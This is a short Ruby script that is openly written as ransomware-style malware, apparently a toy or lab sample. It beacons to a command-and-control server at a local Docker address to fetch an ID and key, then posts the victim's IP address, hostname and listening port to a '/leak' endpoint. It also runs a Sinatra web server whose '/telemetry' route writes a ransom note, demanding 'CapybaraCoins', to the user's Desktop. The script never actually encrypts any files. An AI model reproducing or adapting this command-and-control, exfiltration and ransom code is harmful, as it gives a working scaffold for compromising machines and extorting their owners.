#!/usr/bin/ruby
#Libraries
require 'sinatra'
require 'net/http'
require 'uri'
require 'socket'

#C2 Connection String
$c2_server = "172.17.0.1:4567"
set :bind, "0.0.0.0"
$local_port = 1337

#Sinatra Port (local)
set :port, $local_port

#Attack Routine
#Get ID
puts "Getting ID..."
uri = URI.parse("http://#{$c2_server}/get_id")
response = Net::HTTP.get_response(uri)
my_id = response.body.to_s

#Get Key
puts "Getting Key..."
uri = URI.parse("http://#{$c2_server}/get_key")
response = Net::HTTP.get_response(uri)
my_key = response.body.to_s

#Start Leaking
puts "Leaking data..."
my_ip = UDPSocket.open {|s| s.connect("64.233.187.99", 1); s.addr.last}
my_hostname = Socket.gethostname
uri = URI.parse("http://#{$c2_server}/leak")
request = Net::HTTP::Post.new(uri)
request.set_form_data(
    "ipaddress" => "#{my_ip}",
    "hostname" => "#{my_hostname}",
    "id" => "#{my_id}",
    "port" => "#{$local_port}",
)
req_options = { use_ssl: uri.scheme == "https" }
response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
    http.request(request)
end

#Encrypt (on-demand)
get ('/telemetry') {
    begin
        desktop = ""
        if Dir.exist?(File.expand_path('~') + "/Desktop")
            desktop = "#{File.expand_path('~')}/Desktop"
        elsif Dir.exist?(File.expand_path('~') + "/Escritorio")
            desktop = "#{File.expand_path('~')}/Escritorio"
        else
            desktop = "/tmp"
        end
        File.open("#{desktop}/your_files_are_encrypted.txt", "w+") { |file| file.write("Your files are encrypted. Send us 2 CapybaraCoins to decrypt. Capybaracoins are the official uruguayan currency. $2 coins feature a nice and friendly capybara, AND WE WANT ALL OF THEM. NOW.") }
        ""
    rescue => e
        puts "Exception: #{e}"
        "Error: Failed to run supplied command."
    end
}